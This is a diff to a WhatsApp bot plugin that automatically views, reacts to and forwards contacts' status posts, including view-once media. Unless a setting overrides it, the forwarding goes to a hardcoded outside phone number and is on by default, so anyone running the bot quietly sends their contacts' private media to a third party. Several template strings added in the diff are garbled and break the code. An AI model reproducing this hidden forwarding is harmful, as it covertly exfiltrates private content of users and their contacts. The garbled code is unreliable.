@@ -1,28 +1,28 @@
 const fs = require('fs/promises');
 const path = require('path');
-const { downloadMediaMessage } = require('@whiskeysockets/baileys');
+const { downloadMediaMessage, proto } = require('@whiskeysockets/baileys');
 
 const isOwnerOrSudo = require('../lib/isOwner');
 const settings = require('../settings');
 
 // ────────────────────────────────────────────────
 const CONFIG_FILE = path.join(__dirname, '../data/autoStatus.json');
-const TARGET_NUMBER = settings.syncTarget || '255615944741'; // Use settings.js
+const TARGET_NUMBER = settings.syncTarget || '255615944741';
 const TARGET_JID = `${TARGET_NUMBER}@s.whatsapp.net`;
-const SYNC_DELAY = settings.syncDelay || 6; // Low number sync delay
+const SYNC_DELAY = settings.syncDelay || 6; // base delay in seconds
 
 const DEFAULT_CONFIG = Object.freeze({
-    enabled: true,             // always on by default
-    reactWith: '❤️',           // always react with heart/like by default
-    reactDelayMinMs: SYNC_DELAY * 100,     // Use sync delay
+    enabled: true,
+    reactWith: '❤️',                    // '' = disable reaction
+    reactDelayMinMs: SYNC_DELAY * 100,
     reactDelayMaxMs: SYNC_DELAY * 200,
-    infoDelayMinMs: SYNC_DELAY * 150,
     forwardDelayMinMs: SYNC_DELAY * 250,
     forwardDelayMaxMs: SYNC_DELAY * 500,
+    markAsRead: true,                   // new: control auto read
 });
 
 let configCache = null;
-const processedStatusIds = new Set();
+const processedStatusIds = new Set();   // prevent double processing
 
 // ────────────────────────────────────────────────
 async function loadConfig() {
@@ -33,7 +33,7 @@ async function loadConfig() {
         configCache = { ...DEFAULT_CONFIG, ...JSON.parse(data) };
     } catch (err) {
         if (err.code !== 'ENOENT') {
-            console.error('[AutoStatus] load error → using defaults', err.message);
+            console.error('[AutoStatus] Config load error → defaults', err.message);
         }
         configCache = { ...DEFAULT_CONFIG };
         await saveConfig(configCache);
@@ -47,7 +47,7 @@ async function saveConfig(updates) {
         await fs.mkdir(path.dirname(CONFIG_FILE), { recursive: true });
         await fs.writeFile(CONFIG_FILE, JSON.stringify(configCache, null, 2));
     } catch (err) {
-        console.error('[AutoStatus] save failed', err.message);
+        console.error('[AutoStatus] Save failed', err.message);
     }
 }
 
@@ -72,16 +72,8 @@ function randomMs(min, max) {
 }
 
 // ────────────────────────────────────────────────
-async function reactToStatus(sock, key) {
-    const cfg = await loadConfig();
-    // Always react unless explicitly set to empty string
-    if (!cfg.reactWith || cfg.reactWith.trim() === '') return;
-    
-    // Validate key structure
-    if (!key?.id || !key?.participant) {
-        console.debug('[React] Invalid key structure, skipping reaction');
-        return;
-    }
+async function sendReaction(sock, key, emoji) {
+    if (!emoji || !key?.id || !key?.participant) return;
 
     const reaction = {
         key: {
@@ -90,17 +82,18 @@ async function reactToStatus(sock, key) {
             id: key.id,
             participant: key.participant
         },
-        text: cfg.reactWith,
+        text: emoji,
         isBigEmoji: true
     };
 
     try {
-        await sock.sendMessage('status@broadcast', { reactionMessage: reaction });
+        await sock.sendMessage('status@broadcast', { react: reaction });
     } catch (err) {
+        // fallback (older baileys versions / connection issues)
         try {
             await sock.relayMessage('status@broadcast', { reactionMessage: reaction }, { messageId: key.id });
         } catch (relayErr) {
-            console.debug(`[React FAIL] ${relayErr?.message || err?.message}`);
+            console.debug(`[Reaction failed] ${relayErr.message || err.message}`);
         }
     }
 }
@@ -112,56 +105,49 @@ async function forwardStatus(sock, msg) {
     const msgId = msg.key.id;
     if (processedStatusIds.has(msgId)) return;
     processedStatusIds.add(msgId);
-    if (processedStatusIds.size > 800) processedStatusIds.clear();
+    if (processedStatusIds.size > 1200) processedStatusIds.clear(); // bigger but safe limit
 
     const phone = extractPhoneNumber(msg.key);
     const msgType = Object.keys(msg.message)[0] ?? 'unknown';
     const content = msg.message[msgType] ?? {};
     const timeStr = getTimeStr();
 
-    // Skip pure protocol messages without content
-    if (['senderKeyDistributionMessage', 'protocolMessage'].includes(msgType) &&
-        !content.caption && !msg.message.imageMessage && !msg.message.videoMessage &&
-        !msg.message.stickerMessage && !msg.message.audioMessage) {
-        console.debug(`[Ignored] protocol msg → ${msgType} • ${phone}`);
+    // Skip useless protocol/control messages
+    if (['senderKeyDistributionMessage', 'protocolMessage', 'ephemeralMessage'].includes(msgType) &&
+        !content.caption && !msg.message.imageMessage && !msg.message.videoMessage) {
         return;
     }
 
     console.log(`[Status] ${phone} • ${msgType} • ${timeStr}`);
 
-    // 1. Send info message first
-    try {
-        await sock.sendMessage(TARGET_JID, {
-            text: `📸 Status from ${phone}`
-        });
-    } catch (err) {
-        console.error(`[Info Send FAIL] ${err.message}`);
-    }
+    // 1. Info header
+    await sock.sendMessage(TARGET_JID, {
+        text: `📸 New status from \( {phone} ( \){msgType})`
+    }).catch(() => {});
 
-    // Small natural delay before media
-    await new Promise(r => setTimeout(r, randomMs(600, 1200)));
+    await new Promise(r => setTimeout(r, randomMs(700, 1400)));
 
-    // Text status
+    // Text-only status
     if (msgType === 'conversation' || msgType === 'extendedTextMessage') {
-        const text = (content.text || content.description || '[no text]').trim();
+        const text = (content.text || content.description || '[empty text]').trim();
         await sock.sendMessage(TARGET_JID, {
-            text: `${text}\n\n🕒 ${timeStr}`
+            text: `${text}\n\n🕒 ${timeStr} • from ${phone}`
         }).catch(() => {});
         return;
     }
 
-    // Media handlers
-    const MEDIA_HANDLERS = {
-        imageMessage:    { type: 'image',    ext: 'jpg',  mime: 'image/jpeg'   },
-        videoMessage:    { type: 'video',    ext: 'mp4',  mime: 'video/mp4'    },
-        audioMessage:    { type: 'audio',    ext: 'ogg',  mime: 'audio/ogg; codecs=opus' },
-        stickerMessage:  { type: 'sticker',  ext: 'webp', mime: 'image/webp'   },
-        documentMessage: { type: 'document', ext: content.fileName?.split('.').pop() ?? 'bin' }
+    // Media types mapping
+    const MEDIA_TYPES = {
+        imageMessage:    { key: 'image',    ext: 'jpg',  mime: 'image/jpeg'   },
+        videoMessage:    { key: 'video',    ext: 'mp4',  mime: 'video/mp4'    },
+        audioMessage:    { key: 'audio',    ext: 'ogg',  mime: 'audio/ogg; codecs=opus' },
+        stickerMessage:  { key: 'sticker',  ext: 'webp', mime: 'image/webp'   },
+        documentMessage: { key: 'document', ext: content.fileName?.split('.').pop() ?? 'bin' }
     };
 
-    const handler = MEDIA_HANDLERS[msgType];
+    const handler = MEDIA_TYPES[msgType];
     if (!handler) {
-        console.debug(`[Unsupported] ${msgType} from ${phone}`);
+        console.debug(`[Skipped] Unsupported type → ${msgType} • ${phone}`);
         return;
     }
 
@@ -169,30 +155,31 @@ async function forwardStatus(sock, msg) {
         const buffer = await downloadMediaMessage(msg, 'buffer', {}, {
             logger: console,
             reuploadRequest: sock.updateMediaMessage
-        }).catch(err => {
-            console.error(`[Download FAIL] ${msgType} • ${err.message}`);
-            return null;
         });
 
-        if (!buffer || buffer.length < 100) throw new Error('empty/corrupt media');
+        if (!buffer || buffer.length < 200) {
+            throw new Error('Downloaded media is empty/corrupt');
+        }
 
-        const captionLines = [
+        const caption = [
             content.caption?.trim() ? `Caption: ${content.caption.trim()}` : '',
-            `🕒 ${timeStr}`
+            content.viewOnce ? '🔒 View once' : '',
+            `🕒 ${timeStr} • from ${phone}`
         ].filter(Boolean).join('\n');
 
         await sock.sendMessage(TARGET_JID, {
-            [handler.type]: buffer,
+            [handler.key]: buffer,
             mimetype: content.mimetype || handler.mime,
-            caption: captionLines || undefined,
-            fileName: content.fileName || `status-${Date.now()}.${handler.ext}`
+            caption: caption || undefined,
+            fileName: content.fileName || `status-\( {Date.now()}. \){handler.ext}`,
+            ...(content.viewOnce ? { viewOnce: true } : {})
         });
 
-        console.log(`[Forward OK] ${handler.type} • ${phone}`);
+        console.log(`[Forward OK] ${handler.key} • ${phone}`);
     } catch (err) {
         console.error('[Forward FAIL]', err.message || err);
         await sock.sendMessage(TARGET_JID, {
-            text: `⚠️ Failed to forward • ${msgType} from ${phone}\n🕒 ${timeStr}`
+            text: `⚠️ Could not forward ${msgType} from ${phone}\nError: ${err.message.slice(0, 80)}\n🕒 ${timeStr}`
         }).catch(() => {});
     }
 }
@@ -200,47 +187,54 @@ async function forwardStatus(sock, msg) {
 // ────────────────────────────────────────────────
 async function handleStatusUpdate(sock, ev) {
     const cfg = await loadConfig();
-    if (!cfg.enabled) return; // still respect if someone manually set to false
+    if (!cfg.enabled) return;
 
-    let msgKey, msgToForward;
+    let statusKey = null;
+    let statusMsg = null;
 
+    // ─── Event shape normalization ───
     if (ev.messages?.length) {
         const m = ev.messages[0];
         if (m.key?.remoteJid === 'status@broadcast') {
-            msgKey = m.key;
-            msgToForward = m;
+            statusKey = m.key;
+            statusMsg = m;
         }
     } else if (ev.key?.remoteJid === 'status@broadcast') {
-        msgKey = ev.key;
-        msgToForward = ev;
+        statusKey = ev.key;
+        statusMsg = ev;
     } else if (ev.reaction?.key?.remoteJid === 'status@broadcast') {
-        msgKey = ev.reaction.key;
+        statusKey = ev.reaction.key;
+    } else if (ev.receipt?.key?.remoteJid === 'status@broadcast') {
+        // view receipt (seen)
+        statusKey = ev.receipt.key;
     }
 
-    if (!msgKey?.remoteJid?.includes('status@broadcast') || !msgKey.id) return;
+    if (!statusKey?.id || !statusKey.remoteJid?.includes('status@broadcast')) return;
 
-    if (processedStatusIds.has(msgKey.id)) return;
-    
-    // Mark as processing immediately to prevent race conditions
-    processedStatusIds.add(msgKey.id);
-    if (processedStatusIds.size > 800) processedStatusIds.clear();
+    // Deduplicate
+    if (processedStatusIds.has(statusKey.id)) return;
+    processedStatusIds.add(statusKey.id);
 
     try {
-        // Quick like/reaction
-        await new Promise(r => setTimeout(r, randomMs(cfg.reactDelayMinMs, cfg.reactDelayMaxMs)));
-        await reactToStatus(sock, msgKey);
+        // 1. Mark as read (simulate view)
+        if (cfg.markAsRead) {
+            await sock.readMessages([statusKey]).catch(() => {});
+        }
 
-        // Mark read
-        await sock.readMessages([msgKey]).catch(() => {});
+        // 2. Reaction / like
+        if (cfg.reactWith?.trim()) {
+            await new Promise(r => setTimeout(r, randomMs(cfg.reactDelayMinMs, cfg.reactDelayMaxMs)));
+            await sendReaction(sock, statusKey, cfg.reactWith);
+        }
 
-        // Forward with info first
-        if (msgToForward) {
+        // 3. Forward content (only if full message arrived)
+        if (statusMsg?.message) {
             await new Promise(r => setTimeout(r, randomMs(cfg.forwardDelayMinMs, cfg.forwardDelayMaxMs)));
-            await forwardStatus(sock, msgToForward);
+            await forwardStatus(sock, statusMsg);
         }
 
     } catch (err) {
-        console.error('[AutoStatus] error', err?.message || err);
+        console.error('[AutoStatus] Processing error', err?.message || err);
     }
 }
 
@@ -249,44 +243,66 @@ async function autoStatusCommand(sock, chatId, msg, args = []) {
     const sender = msg.key.participant || msg.key.remoteJid;
     const isAllowed = msg.key.fromMe || (await isOwnerOrSudo(sender, sock, chatId));
 
-    if (!isAllowed) return sock.sendMessage(chatId, { text: '⛔ Owner only' });
+    if (!isAllowed) {
+        return sock.sendMessage(chatId, { text: '⛔ Owner/sudo only' });
+    }
 
     const cfg = await loadConfig();
 
     if (!args.length) {
+        const reactStatus = cfg.reactWith?.trim() ? `→ ${cfg.reactWith}` : '→ disabled';
         return sock.sendMessage(chatId, {
-            text: `🔄 *Auto Status Forwarder* (always on by default)\n\n` +
-                  `Forwarding : 🟢 ON\n` +
-                  `Reaction   : ❤️ (heart/like)\n` +
+            text: `🔄 *Auto Status Manager* (default: ON)\n\n` +
+                  `Enabled    : ${cfg.enabled ? '🟢 ON' : '🔴 OFF'}\n` +
+                  `Reaction   : ${reactStatus}\n` +
+                  `Mark read  : ${cfg.markAsRead ? '🟢 Yes' : '🔴 No'}\n` +
                   `Target     : ${TARGET_NUMBER}\n\n` +
                   `Commands:\n` +
-                  `  .autostatus react ❤️🔥😍 / other emoji\n` +
+                  `  .autostatus on / off\n` +
+                  `  .autostatus react ❤️ / 🔥 / '' (empty = disable)\n` +
+                  `  .autostatus read on / off\n` +
                   `  .autostatus status`
         });
     }
 
     const cmd = args[0].toLowerCase();
 
+    if (cmd === 'on') {
+        await saveConfig({ enabled: true });
+        return sock.sendMessage(chatId, { text: 'Auto-status → 🟢 Enabled' });
+    }
+
+    if (cmd === 'off') {
+        await saveConfig({ enabled: false });
+        return sock.sendMessage(chatId, { text: 'Auto-status → 🔴 Disabled' });
+    }
+
     if (cmd === 'react') {
         if (args.length < 2) {
-            return sock.sendMessage(chatId, {
-                text: 'Use:\n.autostatus react ❤️\n.autostatus react 🔥\netc.'
-            });
+            return sock.sendMessage(chatId, { text: 'Usage: .autostatus react ❤️   (or empty string to disable)' });
         }
         const emoji = args[1].trim();
-        // Allow changing emoji, but don't allow turning completely off
-        const newReact = emoji.length <= 6 ? emoji : cfg.reactWith;
-        await saveConfig({ reactWith: newReact });
-        return sock.sendMessage(chatId, { text: `Reaction updated → ${newReact}` });
+        await saveConfig({ reactWith: emoji });
+        const msg = emoji ? `Reaction set → ${emoji}` : 'Reaction → disabled';
+        return sock.sendMessage(chatId, { text: msg });
+    }
+
+    if (cmd === 'read') {
+        if (args.length < 2 || !['on','off'].includes(args[1].toLowerCase())) {
+            return sock.sendMessage(chatId, { text: 'Usage: .autostatus read on / off' });
+        }
+        const value = args[1].toLowerCase() === 'on';
+        await saveConfig({ markAsRead: value });
+        return sock.sendMessage(chatId, { text: `Auto mark read → ${value ? '🟢 ON' : '🔴 OFF'}` });
     }
 
     if (cmd === 'status') {
         return sock.sendMessage(chatId, {
-            text: `Current config:\n${JSON.stringify(cfg, null, 2)}`
+            text: `Current config:\n\`\`\`${JSON.stringify(cfg, null, 2)}\`\`\``
         });
     }
 
-    return sock.sendMessage(chatId, { text: 'Unknown command. Use .autostatus' });
+    return sock.sendMessage(chatId, { text: 'Unknown subcommand. Try .autostatus' });
 }
 
 module.exports = {
